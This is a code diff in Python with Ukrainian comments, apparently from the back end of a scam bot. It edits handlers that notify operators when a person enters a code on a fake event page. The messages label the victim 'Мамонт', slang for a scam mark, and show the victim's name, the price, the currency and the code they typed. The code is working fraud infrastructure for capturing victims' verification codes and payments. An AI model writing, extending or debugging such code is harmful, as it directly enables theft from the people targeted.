@@ -393,8 +393,8 @@ def format_code_request_message(admin_username, name, price, currency, page_code
     else:
         message += f"🧑‍🏭 Вбивер: @Не указано\n"
     
-    # Мамонт (ФІО користувача) - тільки якщо є справжнє ім'я
-    if name and not name.startswith('User_'):
+    # Мамонт (ФІО користувача) - завжди показуємо, якщо є
+    if name:
         message += f"🐘 Мамонт: {name}\n"
     
     # Сума - тільки якщо є
@@ -2858,8 +2858,12 @@ async def code_notify(request):
     else:
         print(f"[code_notify] page_code відсутній")
     
-    if page_code:
-        # Отримуємо інформацію про подію
+    # Отримуємо ціну та валюту з запиту (пріоритет) або з бази даних
+    event_price = data.get('price')  # Спочатку шукаємо в запиті
+    event_currency = data.get('currency')  # Спочатку шукаємо в запиті
+    
+    if not event_price and page_code:
+        # Якщо ціна не передана, шукаємо в базі даних
         event_info = get_event_info_by_page_code(page_code)
         if event_info:
             event_price = event_info.get('price')
@@ -2867,6 +2871,8 @@ async def code_notify(request):
     
     # Отримуємо код, який ввела людина (якщо є)
     code_value = data.get('code', '')
+    
+    print(f"[code_notify] Використовуємо ціну: {event_price} {event_currency}")
     
     # Формуємо красиве повідомлення про код
     code_message = format_code_request_message(
